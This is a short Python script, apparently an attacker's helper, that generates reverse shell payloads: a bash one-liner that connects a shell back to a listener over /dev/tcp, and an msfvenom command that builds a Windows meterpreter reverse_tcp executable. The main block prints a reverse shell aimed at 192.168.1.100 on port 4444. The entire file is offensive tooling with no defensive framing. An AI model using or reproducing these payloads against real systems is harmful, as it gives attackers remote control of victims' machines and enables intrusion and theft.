def generate_custom_payload(payload_type, lhost, lport):
    if payload_type == "reverse_shell":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif payload_type == "meterpreter":
        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o output.exe"
    else:
        payload = "Unknown payload type"

    return payload

if __name__ == "__main__":
    payload = generate_custom_payload("reverse_shell", "192.168.1.100", 4444)
    print(payload)